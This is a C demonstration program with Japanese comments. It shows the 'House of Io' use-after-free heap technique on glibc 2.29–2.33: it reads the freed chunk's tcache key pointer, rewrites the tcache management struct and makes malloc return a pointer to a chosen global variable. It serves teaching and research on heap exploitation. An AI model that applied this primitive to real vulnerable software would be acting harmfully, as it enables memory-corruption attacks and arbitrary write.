#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io - Use after free(解放後使用)版
// ====================================
//
// Source: https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// libc バージョン 2.31、2.32、2.33 でテストされています。
//
// House of Io は、チャンク(chunk)を tcache に free するとき、
// そのチャンクが、あらかじめ割り当てられている tcache 管理構造体へのポインタを
// 受け取るという事実を利用します。このポインタは、free された
// tcache チャンクの tcache->key エントリです。この攻撃には3つのバージョンがあり、
// いずれも safe-link が有効でも動作します。tcache の key ポインタ、そしてより重要なことに
// tcache_perthread_struct 内のポインタが保護されていないためです。
//
// House of Io は libc バージョン 2.29 - 2.33 でのみ動作します。これらの
// バージョンでは、tcache エントリの key が tcache 管理構造体への
// ポインタになっているためです。これにより、攻撃者は tcache_metadata_poisoning
// 攻撃を実行できる可能性があります。
//
// ただし、元の記事に書かれているとおり、このエクスプロイトのプリミティブはかなり制約されています。
// 負方向のオーバーフローはまれで、double free 版に必要な
// 特定の順序での free もまれです。この use after free 版は、もう少し現実的です。

unsigned long global_var = 1;

struct overlay {
  uint64_t *next;
  uint64_t *key;
};

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  puts("House of Io では、free された tcache チャンクの2番目のスロットに、\n"
       "tcache 管理構造体へのポインタが挿入されるという\n"
       "事実を利用します。\n");

  puts(
      "このバージョンは use-after-free 版で、free された構造体の\n"
      "オフセット +0x08 に、読み書きできるポインタがある場合に使えます。\n"
      "このポインタは free されたチャンクの tcache->key エントリで、\n"
      "tcache 管理構造体へのポインタを含んでいます。\n"
      "このポインタを使えば、tcache 管理構造体を操作して、\n"
      "任意のポインタを返させることができます。\n");

  printf("具体的には、%p にある `global_var` へのポインタが、\n"
         "malloc から返されるようにします。\n\n",
         &global_var);

  puts("まず、オフセット +0x08 にポインタを持つ構造体を\n"
       "割り当てる必要があります。\n");
  struct overlay *ptr = malloc(sizeof(struct overlay));

  ptr->next = malloc(0x10);
  ptr->key = malloc(0x10);

  puts("次に、その構造体をすぐに free して、tcache 管理構造体への\n"
       "ポインタを得ます。\n");
  free(ptr);

  printf("tcache 構造体は %p にあります。\n\n", ptr->key);
  struct tcache_perthread_struct *management_struct =
      (struct tcache_perthread_struct *)ptr->key;

  puts(
      "これで管理構造体へのポインタを得たので、その値を操作できます。\n"
      "まず、場合によっては、最初の bin のカウンタを 0 より大きい数に\n"
      "増やして、少なくとも1つのチャンクを free したと tcache に思わせる\n"
      "必要があります。今回は、`overlay` 構造体が最初の bin に収まり、\n"
      "すでにそれを free しているため、この操作は必要ありません。\n"
      "tcache_perthread_struct の最初のメンバは、カウンタの配列です。\n"
      "そのため、ポインタの最初の要素を上書きすることで、\n"
      "配列に正しい値を設定します。\n");
  management_struct->counts[0] = 1;

  printf("tcache bin のポインタを上書きする前、この bin には\n"
         "[ %p ] が入っています。これは、最初に作った free 済みの overlay 構造体と\n"
         "同じです [ %p == %p ]。\n\n",
         management_struct->entries[0], management_struct->entries[0], ptr);
  management_struct->entries[0] = (uint64_t)&global_var;
  printf(
      "書き込みの後、グローバル変数へのポインタが\n"
      "tcache に入りました [ %p ]。\n\n",
      management_struct->entries[0]);

  puts("この tcache bin から新しいチャンクを割り当てると、\n"
       "標的の位置へのポインタが得られます。\n");
  uint64_t *evil_chunk = malloc(0x10);

  assert(evil_chunk == &global_var);
  return 0;
}
